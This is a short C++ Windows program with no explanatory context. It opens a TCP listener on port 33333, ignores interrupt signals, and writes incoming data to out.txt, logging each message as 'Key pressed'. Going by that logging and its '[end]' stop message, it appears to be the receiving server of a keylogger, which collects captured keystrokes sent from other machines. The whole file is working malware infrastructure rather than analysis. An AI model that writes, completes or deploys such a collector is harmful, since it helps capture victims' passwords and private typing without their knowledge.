#include "winsock2.h"
#include <windows.h>
#include <iostream>
#include <csignal>
#include <cstdio>
#include <cstdlib>
using namespace std;
const int PORT = 33333;
void quit();
int main()
{
    signal(SIGINT, SIG_IGN);
    signal(SIGBREAK, SIG_IGN);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);
    bind(server, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
    listen(server, 25);
    freopen("out.txt", "w", stdout);
    while (1)
    {
        SOCKADDR_IN clientAddr;
        int addrSize = sizeof(clientAddr);
        SOCKET client = accept(server, (SOCKADDR *)&clientAddr, &addrSize);
        char recvBuf[MAXBYTE] = {0};
        int ret = recv(client, recvBuf, MAXBYTE, 0);
        if (ret > 0)
        {
            if (strncmp(recvBuf, "[end]", 6) == 0)
            {
                quit();
                closesocket(client);
                break;
            }
            printf("%s", recvBuf);
            clog << "Key pressed: " << recvBuf << endl;
        }
        closesocket(client);
    }
    fclose(stdout);
    freopen("CON", "w", stdout);
    system("pause");
    closesocket(server);
    WSACleanup();

    return 0;
}
void quit()
{
    clog << "Key pressed: [end].\nProgram quit.\n";
}